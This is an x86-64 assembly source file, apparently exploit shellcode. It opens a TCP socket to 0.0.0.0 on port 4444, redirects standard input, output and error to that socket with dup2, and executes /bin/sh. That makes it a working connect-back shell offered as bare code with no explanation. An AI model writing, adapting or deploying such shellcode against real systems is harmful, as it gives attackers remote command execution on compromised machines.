global _start

section .text

_start:

xor eax, eax ; zero out EAX
xor ebx, ebx ;
xor ecx, ecx ;
xor edx, edx ;


socket:

	; /usr/include/asm/unistd_64.h
	; #define __NR_socket 41
	; sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	xor rdi, rdi    ;
	mov rdx, rdi    ; // 0
	add rdi, 2      ; // python -c 'import socket; print socket.AF_INET'
	xor rsi, rsi    ;
	add rsi, 1      ; // python -c 'import socket; print socket.AF_INET'
	
	xor rax, rax
	add rax, 41
	syscall
	
	mov rdi, rax   ; save sockfd dans rdi
	xor rax, rax

server_struct:
	push rax
	mov dword [rsp-4], eax     ;
	mov word [rsp-6], 0x5c11   ;
	mov word [rsp-8], 0x2      ; // addr.sin_family = AF_INET;
	sub rsp, 8
	
	
connect:
	; connect(sockfd, (struct sockaddr*)&addr, sizeof(addr));
	; #define __NR_connect 42
	
	mov rsi, rsp
	mov rdx, 16
	add rax, 42
	syscall
	
duplicate_sockets:
	; #define __NR_dup2 33
	; dup2(sockfd, 0);
	
	xor rsi, rsi
	xor rax, rax
	mov al, 33
	syscall
	
	mov sil, 1
	mov al, 33
	syscall
	
	mov sil, 2
	mov al, 33
	syscall
	
execve:
	; #define __NR_execve 59
	; execve("/bin/sh", NULL, NULL);
	xor rdi, rdi
	xor rax, rax
	push rax
	
	mov rbx, 0x68732f6e69622f
	push rbx
	mov rdi, rsp
	
	push rax
	mov rdx, rsp
	
	push rdi
	mov rsi, rsp
	
	add rax, 59
	syscall
	
	
